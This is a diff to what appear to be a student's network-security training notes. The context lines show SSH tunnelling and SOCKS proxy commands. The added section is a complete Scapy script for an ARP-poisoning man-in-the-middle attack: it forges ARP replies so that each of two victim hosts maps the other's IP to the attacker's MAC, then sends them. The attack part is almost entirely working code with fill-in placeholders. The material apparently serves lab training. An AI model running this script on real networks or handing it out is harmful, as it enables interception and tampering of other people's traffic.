@@ -334,10 +334,46 @@ TUNNLES TRAINING 5
 @blueinternethost:~$ ssh Cheryl@127.0.0.1 -p 41103 -L 41106:127.0.0.1:41105 -NT
 @blueinternethost:~$ ssh Malory@127.0.0.1 -p 41106 -D 9050 -NT
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-TUNNLES TRAINING 6
+MITM ARP ATTACK
 
+my_mac = "00:50:56:8c:58:df"             #Insert Your MAC address
+victim1_mac = "00:50:56:8c:a1:3d"        #Insert victim1 MAC address
+victim1_ip = "172.16.82.115"         #Insert victim1 IP address
+victim2_mac = "00:50:56:8c:fd:6c"        #Insert victim2 MAC address
+victim2_ip = "172.16.82.126"         #Insert victim2 IP addres
 
+# -- ARP to Poison Victim 1 to pretend to be Victim 2 --
+a = Ether()
+a.src= my_mac
+a.dst= victim1_mac
+a.type= 0x0806
 
+b = ARP()
+b.op= 2
+b.hwsrc= my_mac
+b.psrc= victim2_ip    #Who you are pretending to be
+b.hwdst= victim1_mac  #Who's ARP cache you are trying to poison
+b.pdst= victim1_ip    #Who's ARP cache you are trying to poison
+
+# -- ARP to Poison Victim 2 to pretend to be Victim 1 --
+c = Ether()
+c.src= my_mac
+c.dst= victim2_mac
+c.type= 0x0806
+
+d = ARP()
+d.op= 2
+d.hwsrc= my_mac
+d.psrc= victim1_ip    #Who you are pretending to be
+d.hwdst= victim2_mac  #Who's ARP cache you are trying to poison
+d.pdst= victim2_ip    #Who's ARP cache you are trying to poison
+
+a.show()
+b.show()
+c.show()
+d.show()
+
+sendp(a/b); sendp(c/d)
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 MAP 2 - DATA COLLECTION
 @net-ssh-01:~$ ssh student@10.49.210.171 -R 41100:127.0.0.1:22 -NT
